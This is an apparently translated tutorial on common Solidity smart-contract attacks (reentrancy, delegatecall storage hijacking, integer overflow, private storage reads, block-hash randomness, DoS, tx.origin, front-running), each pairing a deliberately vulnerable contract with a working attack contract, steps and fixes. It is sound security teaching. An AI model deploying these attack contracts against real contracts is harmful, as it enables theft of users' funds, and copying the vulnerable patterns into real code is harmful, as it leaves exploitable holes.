# Common Attacks

### Re-Entrancy Reentrancy Attack

The so-called re-entry means that A calls B, and A is called in B. Of course, re-entry is not a problem. The key to the attack here is that although A will check the relevant state before calling B, it will only change the relevant state after B returns, which leads to the cycle of A calling B and B calling A. Keep looping until B actively stops.

Attack example:



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

In this example, EtherStore is a compromised contract that can stake and withdraw ETH. Attack is a contract that attacks EtherSotre.

Attack steps:

1. Deploy EtherStore

2. Alice and Bob each pledge 1 ETH to EtherStore
3. Eve uses the address of the EtherStore to deploy Attack
4. Eve calls Attack.attack
5. Eve retrieves 3 ETH from the EtherStore (1 staked by herself and 2 belonged to Alice and Bob)
6. Pre-knowledge points:

How much ETH a contract owns is recorded in the <address>.balance field, which is done automatically when processing Transaction, and does not require the contract to write code to implement. Therefore, although the EtherStore contract in the above sample code uses a mapping type of balances to record the number of pledges of different people, it is only a record. When transferring funds (especially transferring out), it really depends on how many coins are in <address>.balance.
The fallback function is a special function in the contract. When calling a function of a contract, if the function signature of the function implemented in the called contract (such as getBalance() public view returns (uint) is a function signature) is not consistent with it If it matches, the fallback function (if you are familiar with Python, it is equivalent to the __missing__ method in Python) will be called. In the example msg.sender.call will be called into the fallback function.
Attack explained:
In the above example, Alice and Bob pledged 1 ETH respectively, so there are 2 ETH in address(Etherstore).balance. When Eve called Attack.attack, he pledged 1 ETH first, in order to pass the initial judgment when calling EtherStore.withdraw:

     function withdraw() public {
         uint bal = balances[msg. sender];
         require(bal > 0);
    
         /// hide code  …
     }
After Eve pledged 1 ETH, he called EtherStore.withdraw to start withdrawing and stealing ETH. The implementation of EtherStore.withdraw is to first judge whether there is a pledge of the caller (that is, Eve) in EtherStore.balances. If there is (of course, 1 ETH), first call msg.sender.call{value: bal}("") Return ETH to Eve; and msg.sender.call{value: bal}("") This call will not only transfer bal so much ETH to Eve's account, but also enter Attack.fallback, in Attack.fallback , the attacker calls EtherStore.withdraw again. Since the record of Eve in EtherStore.balances has not been cleared, the initial judgment of EtherStore.withdraw can still pass, and then transfer bal ETH to the Eve account again. If looping, cannot stop until Attak.fallback no longer calls EtherStore.withdraw.



##### How to avoid:

```solidity
 function withdraw() public {
     uint bal = balances[msg.sender];
     require(bal > 0);
     balances[msg.sender] = 0; // reset, then call

     (bool sent, ) = msg.sender.call{value: bal}("");
     require(sent, "Failed to send Ether");
 }
```

Use a lock to prevent reentrancy:

```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.13;

 contract ReEntrancyGuard {
     bool internal locked;

     modifier noReentrant() {
         require(!locked, "No re-entrancy");
         locked = true;
         _;
         locked = false;
     }
 }
```

Try not to use call , use send or transfer instead



### Delegatecall


delegatecall is a function provided in the solidity language. The difference between delegatecall and ordinary call is that when using delegatecall to enter the target function, its context information (such as msg.sender, contract state variables, etc.) is the information of the caller. In other words, the effect of delegatecall is related to copying the code of the called function to the current environment for execution.

Attack example (there are two examples in the link, we chose the more complicated one here):



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // override address of lib
        hackMe.doSomething(uint(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        hackMe.doSomething(1);
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}
```

In the above example, HackMe is the contract being attacked; Attack is the contract that initiated the attack.

Attack steps:

1. Alice deploys the Lib contract, then uses the address of the Lib contract to deploy the HackMe contract

2. Eve deploys the Attack contract using the address of the HackMe contract
3. Eve calls Attack.attack
4. The owner of HackMe becomes the Attack contract (the original owner is Alice)

Key knowledge points:

1. When using delegatecall, the context information is the context information of the caller, including contract state variables, msg.sender.



Attack explained:
When Attack.attack is called, HackMe.doSomething is first called; while in HackMe.doSomething, delegatecall is used to call Lib.doSomething, and the incoming parameter is the address of the Attack contract. Although from the source code point of view, Lib.doSomething updates Lib.someNumber , but in fact it only updates "the first field in the current contract field". The specific opcode code is quite annoying, so let’s just look at the decompiled code. The following is the decompiled code of Lib.doSomething:

```solidity
function func_0063(var arg0) {
         storage[0x00] = arg0;
     }
```

Although it is a decompiled code, we know that the sstore instruction is used to store storage here. The explanation code of this instruction is as follows:

```solidity
func opSstore(pc *uint64, interpreter *EVMInterpreter, scope *ScopeContext) ([]byte, error) {
	if interpreter.readOnly {
		return nil, ErrWriteProtection
	}
	loc := scope.Stack.pop()
	val := scope.Stack.pop()
	interpreter.evm.StateDB.SetState(scope.Contract.Address(),
		loc.Bytes32(), val.Bytes32())
	return nil, nil
}
```

In our case, the loc variable is 0 and the val variable is arg0 . Obviously the key here is the return value of scope.Contract.Address(), its code is as follows:

```solidity
func (c *Contract) Address() common. Address {
return c.self.Address()
}
```

That is, the value of the Contract.self (type ContractRef) field, obviously self represents the address of the contract itself. So where is this value assigned? Let's take a look at the code of EVM.DelegateCall:

```solidity
func (evm *EVM) DelegateCall(caller ContractRef, addr common.Address, input []byte, gas uint64) (ret []byte, leftOverGas uint64, err error) {
     /// hide code  …
     contract := NewContract(caller, AccountRef(caller.Address()), nil, gas).AsDelegate()
             contract.SetCallCode(&addrCopy, evm.StateDB.GetCodeHash(addrCopy), evm.StateDB.GetCode(addrCopy))
             ret, err = evm. interpreter. Run(contract, input, false)
             gas = contract. Gas
     /// hide code  …
}
```

A new Contract object will be generated here. Note that the second parameter of NewContract is actually the caller (the address of the caller), which is also the value assigned to Contract.self:

```solidity
func NewContract(caller ContractRef, object ContractRef, value *big.Int, gas uint64) *Contract {
c := &Contract{CallerAddress: caller.Address(), caller: caller, self: object}
     /// hide code  …
     return c
}
```

So, in summary, Lib.doSomething seems to modify the value of Lib.someNumber, but in fact it just modifies "the value of storage 0 of the current contract address"; and since it is called by delegatecall, its The "current contract" is its caller, not itself. So in this case, what it actually modifies is the value of storage 0 of its caller, namely HackMe.lib. Since the incoming parameter is the address of the Attack contract, this step changes the value of HackMe.lib to the address of HackMe.

Next Attack.attack calls HackMe.doSomething again; inside HackMe.doSomething, lib.doSomething is still called with a delegatecall. However, in the previous step, HackMe.lib has been changed to the address of the Attack contract, so at this time, Attack.doSomething is actually called using the delegatecall method.

In Attack.doSometing , set owner to msg.sender . msg.sender is of course Eve, which is easy to understand; similar to the modification of the HackMe.lib address just now, it seems that Attack.owner is updated from the source code, but in fact it is just updating "the value of storage 1 in the current contract field"; And because of the use of delegatecall, the current contract actually belongs to HackMe instead of Attack, so the HackMe.owner is changed to Eve.

At this point, you should be able to understand why the state variables of Attack and HackMe are required to be the same, because if they are the same, the storage numbers of each field compiled by them will be the same, and the corresponding state variables can be correctly modified when using delegatecall.

(The storage 0 and other terms used in the above explanation are actually called slots. If the above explanation can be understood, that’s good; if you really don’t understand it, then you can read the article about "Accessing private data" in this article "Discussion, where the storage of state variables of the contract is explained in detail, that is, layout in storage)

How to avoid:

1. Try not to use delegatecall;
2. If you must use it, try to only use delegatecall to call functions that do not modify state variables



### Integer Overflow



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
```



Attack steps:

1. Deploy the TimeLock contract
2. Deploy the Attack contract using the address of the TimeLock contract
3. Call the Attack.attack function with 1 ETH
4. Although the Attack.attack function pledges 1 ETH into the TimeLock, it can retrieve the pledged coins immediately

How to avoid:

1. Avoid overflow with SafeMath
2. Use solidity version 0.8 or higher



### Private Data

The solidity language has visibility control over contract state variables, but this control is only valid between contracts, and is invalid for eth_getStorageAt or web3.eth.getStorageAt, they can still get the value of private type state variables



```solidity
pragma solidity ^0.8.13;

contract Vault {
    // slot 0
    uint public count = 123;
    // slot 1
    address public owner = msg.sender;
    bool public isTrue = true;
    uint16 public u16 = 31;
    // slot 2
    bytes32 private password;

    // constants do not use storage
    uint public constant someConst = 123;

    // slot 3, 4, 5 (one for each array element)
    bytes32[3] public data;

    struct User {
        uint id;
        bytes32 password;
    }

    // slot 6 - length of array
    // starting from slot hash(6) - array elements
    // slot where array element is stored = keccak256(slot)) + (index * elementSize)
    // where slot = 6 and elementSize = 2 (1 (uint) +  1 (bytes32))
    User[] private users;

    // slot 7 - empty
    // entries are stored at hash(key, slot)
    // where slot = 7, key = map key
    mapping(uint => User) private idToUser;

    constructor(bytes32 _password) {
        password = _password;
    }

    function addUser(bytes32 _password) public {
        User memory user = User({id: users.length, password: _password});

        users.push(user);
        idToUser[user.id] = user;
    }

    function getArrayLocation(
        uint slot,
        uint index,
        uint elementSize
    ) public pure returns (uint) {
        return uint(keccak256(abi.encodePacked(slot))) + (index * elementSize);
    }

    function getMapLocation(uint slot, uint key) public pure returns (uint) {
        return uint(keccak256(abi.encodePacked(key, slot)));
    }
}
```



Attack steps:

1. Deploy the contract and get the contract address (assumed to be A)
2. Get the value of the password state variable: web3.eth.getStorageAt(A, 2, console.log)
3. Obtain the values of other state variables (see the notes in the original text, where the method of obtaining each state variable is written in more detail, so I will not list them here)



### Attacks against using Block information as a source of random numbers

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
NOTE: cannot use blockhash in Remix so use ganache-cli

npm i -g ganache-cli
ganache-cli
In remix switch environment to Web3 provider
*/

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

It takes time to generate a new block. It takes about 12 seconds for Ethereum using PoW to generate a block. During this time, the attacker can use the same method to calculate the answer value, and then call the GuessTheRandomNumber.guess function , the concept of "guessing right" is 100%.



### DoS 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // You can also perform a DOS by consuming all gas using assert.
    // This attack will work even if the calling contract does not check
    // whether the call was successful or not.
    //
    // function () external payable {
    //     assert(false);
    // }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
```



Attack steps:

1. Deploy KingOfEther
2. Alice becomes King by staking 1 ETH by calling KingOfEther.claimThrone
3. Eve uses the address of KingOfEther to deploy Attack
4. Eve calls Attack.attack to pledge 3 ETH to become the new King (at the same time Alice receives 1 ETH returned to TA)
5. After that, when someone calls KingOfEther.claimThrone to pledge coins, even if it is more than 3 ETH, it will not become a new King, and Eve has always been King.

Key knowledge points:

1. If you want to send ETH to a smart contract, the smart contract must implement at least one of the functions receive or fallback, otherwise sending ETH to this contract will not succeed.



### tx.origin

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
```



Attack steps:

1. Alice deploys the Wallet contract.

2. Eve deploys the Attack contract using the Wallet's address.
3. Eve tricks Alice into calling Attack.attack.
4. Eve successfully steals all the coins in Alice's account.

1. Key knowledge points:
   As can be seen from the documentation, msg.sender and tx.origin represent different meanings:
   1. msg.sender: the current caller
   2. tx.origin: transaction sender





## Race across functions

An attacker could also use two different functions that share state variables to perform a similar attack.

```texts
// INSECURE
mapping (address => uint) private userBalances;

function transfer(address to, uint amount) {
    if (userBalances[msg.sender] >= amount) {
       userBalances[to] += amount;
       userBalances[msg.sender] -= amount;
    }
}

function withdrawBalance() public {
    uint amountToWithdraw = userBalances[msg.sender];
    if (!(msg.sender.call.value(amountToWithdraw)())) { throw; } // At this point, the caller's code is executed, and can call transfer()
    userBalances[msg.sender] = 0;
}
```

In this example, the attacker calls transfer() when they call the withdrawBalance function externally. If the withdrawBalance has not been executed to userBalances[msg.sender] = 0; here, then their balance has not been cleared, then they can call transfer() to transfer tokens even though they have already received them. This weakness can also be used to attack the DAO.

The same solution will work, zeroing out before performing the transfer operation. Also note that in this example all functions are within the same contract. However, the same bug can also occur in cross-contract calls if those contracts share state.

## pitfalls in the race solution

Since race conditions can occur across function calls as well as cross-contract calls, any solution that simply avoids reentrancy will not be sufficient.

Instead, we recommend that all internal work should be done first before making external calls. This rule avoids race conditions. However, you should not only avoid calling extrinsic functions prematurely but also avoid calling extrinsic functions that also call extrinsic functions. For example, the following piece of code is unsafe:

```text
// INSECURE
mapping (address => uint) private userBalances;
mapping (address => bool) private claimedBonus;
mapping (address => uint) private rewardsForA;

function withdraw(address recipient) public {
    uint amountToWithdraw = userBalances[recipient];
    rewardsForA[recipient] = 0;
    if (!(recipient.call.value(amountToWithdraw)())) { throw; }
}

function getFirstWithdrawalBonus(address recipient) public {
    if (claimedBonus[recipient]) { throw; } // Each recipient should only be able to claim the bonus once

    rewardsForA[recipient] += 100;
    withdraw(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.
    claimedBonus[recipient] = true;
}
```

Although getFirstWithdrawalBonus() does not directly call the external contract, it calls withdraw() which causes a race condition. Here you should not consider withdraw() to be trusted.

```text
mapping (address => uint) private userBalances;
mapping (address => bool) private claimedBonus;
mapping (address => uint) private rewardsForA;

function untrustedWithdraw(address recipient) public {
    uint amountToWithdraw = userBalances[recipient];
    rewardsForA[recipient] = 0;
    if (!(recipient.call.value(amountToWithdraw)())) { throw; }
}

function untrustedGetFirstWithdrawalBonus(address recipient) public {
    if (claimedBonus[recipient]) { throw; } // Each recipient should only be able to claim the bonus once

    claimedBonus[recipient] = true;
    rewardsForA[recipient] += 100;
    untrustedWithdraw(recipient); // claimedBonus has been set to true, so reentry is impossible
}
```

In addition to fixing bugs to make reentrancy impossible, [untrusted functions have also been marked](https://link.zhihu.com/?target=https%3A//github.com/ConsenSys/smart-contract -best-practices%23mark-untrusted-contracts). Same scenario: untrustedGetFirstWithdrawalBonus() calls untrustedWithdraw(), which calls an external contract, so untrustedGetFirstWithdrawalBonus() is unsafe here.

Another frequently mentioned solution is (*Translator's Note: Like in traditional multithreaded programming*) using [mutex](https://link.zhihu.com/?target=https%3A//en. wikipedia.org/wiki/Mutual_exclusion). It "locks" the current state, and only the current owner of the lock can change the current state. A simple example is as follows:

```text
// Note: This is a rudimentary example, and mutexes are particularly useful where there is substantial logic and/or shared state
mapping (address => uint) private balances;
bool private lockBalances;

function deposit() payable public returns (bool) {
    if (!lockBalances) {
        lockBalances = true;
        balances[msg.sender] += msg.value;
        lockBalances = false;
        return true;
    }
    throw;
}

function withdraw(uint amount) payable public returns (bool) {
    if (!lockBalances && amount > 0 && balances[msg.sender] >= amount) {
        lockBalances = true;

        if (msg.sender.call(amount)()) { // Normally insecure, but the mutex saves it
          balances[msg.sender] -= amount;
        }

        lockBalances = false;
        return true;
    }

    throw;
}
```

If the user tries to call withdraw() a second time before the first call completes, they will be locked. This seems to work, but the problem becomes serious when you use multiple contracts to interact with each other. Here is an unsafe piece of code:

```text
// INSECURE
contract StateHolder {
    uint private n;
    address private lockHolder;

    function getLock() {
        if (lockHolder != 0) { throw; }
        lockHolder = msg.sender;
    }

    function releaseLock() {
        lockHolder = 0;
    }

    function set(uint newState) {
        if (msg.sender != lockHolder) { throw; }
        n = newState;
    }
}
```

An attacker could just call getLock() and never call releaseLock() again. If they do this, the contract will be permanently locked, and any subsequent operations will not happen. If you use mutexes to avoid race conditions, then make sure that there is no place that can interrupt the lock process or never release the lock. (There is also a potential threat here, such as deadlock and livelock. It is best to read a lot of relevant literature before you decide to use locks (*Translator's Note: This is true, the traditional use of locks in a multi-threaded environment Always an easy place to go wrong *))



\* Some people might object to using the term *race*, since Ethereum doesn't really implement parallel execution. Yet the logic remains a race for resources, the same pitfalls and potential solutions.



## Transaction Order Dependency (TOD) / Previous runs first

The above is an example of a race condition involving an attacker executing malicious code within a **single transaction**. The following demonstrates the race condition caused by the operation principle of the blockchain itself: the order of transactions (in the same block) is easily manipulated.

Since the transaction will be stored in the mempool in a short period of time, it is possible to know what will happen before the miner packs it into the block. This is cumbersome for a decentralized marketplace, since token transactions can be viewed and the order of transactions can be changed before it is included in a block. Avoiding this is difficult because it comes down to the specific contract itself. For example, in marketplaces, it is better to implement batch auctions (this also prevents high-frequency trading problems). Another way to use the pre-commit scheme ("I'll provide details later").



## Timestamp dependencies

Note that the timestamps of blocks can be manipulated by miners, and all direct and indirect uses of timestamps should be considered. **Block count** and **Average block time** can be used to estimate time, but this is not proof that block time may change in the future (such as Casper expects changes).

```text
uint someVariable = now + 1;

if (now % 2 == 0) { // the now can be manipulated by the miner

}

if ((someVariable - 100) % 2 == 0) { // someVariable can be manipulated by the miner

}
```



## Integer overflow and underflow

There are about [20 examples of overflow and underflow](https://link.zhihu.com/?target=https%3A//github.com/ethereum/solidity/issues/796%23issuecomment-253578925).

Consider this simple transfer operation:

```text
mapping (address => uint256) public balanceOf;

// INSECURE
function transfer(address _to, uint256 _value) {
    /* Check if sender has balance */
    if (balanceOf[msg.sender] < _value)
        throw;
    /* Add and subtract new balances */
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;
}

// SECURE
function transfer(address _to, uint256 _value) {
    /* Check if sender has balance and for overflows */
    if (balanceOf[msg.sender] < _value || balanceOf[_to] + _value < balanceOf[_to])
        throw;

    /* Add and subtract new balances */
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;
}
```

If the balance reaches the maximum value of **uint** (2^256), it will become 0 again. Should check here. Whether overflow is relevant depends on the specific implementation. Think if there is a chance that the uint value will be that big or and who will change it's value. If any user has the right to change the value of uint then it will be more vulnerable. If only administrators can change its value, then it's probably safe, since there's no other way to get around that restriction.

The same is true for underflow. If a uint is changed to less than 0, it will cause it to underflow and be set to the maximum value (2^256).

Also be careful with smaller numeric types like uint8, uint16, uint24, etc.: they tend to reach their maximum value more easily.



## Initiate DoS through block Gas Limit

You may have noticed another problem in the previous example: transferring money to everyone at once is likely to cause the upper limit of the Ethereum block gas limit to be reached. Ethereum stipulates the gas limit that can be spent in each block. If it exceeds your transaction, it will fail.

This can cause problems even without an intentional attack. However, the worst thing is if the gas cost is manipulated by an attacker. In the previous example, if the attacker adds a part of the collection list and sets each collection address to receive a small amount of refund. In this way, more gas will be spent to reach the upper limit of the block gas limit, and the entire transfer operation will also end in failure.

Once again proved [priority to use pull rather than push payment system] (https://link.zhihu.com/?target=https%3A//github.com/ConsenSys/smart-contract-best-practices/blob/master /README-zh.md%23favor-pull-over-push-payments).

If you really have to make transfers by iterating over a variable-length array, it's best to estimate how many blocks and how many transactions it will take to complete them. Then you also have to be able to keep track of where you are so you can recover from there if the operation fails, for example:

```text
struct Payee {
    address addr;
    uint256 value;
}
Payee payees[];
uint256 nextPayeeIndex;

function payOut() {
    uint256 i = nextPayeeIndex;
    while (i < payees.length && msg.gas > 200000) {
      payees[i].addr.send(payees[i].value);
      i++;
    }
    nextPayeeIndex = i;
}
```

As shown above, you have to make sure that there are no other transactions that are executing before the next execution of payOut(). If you must, please use the above method to deal with.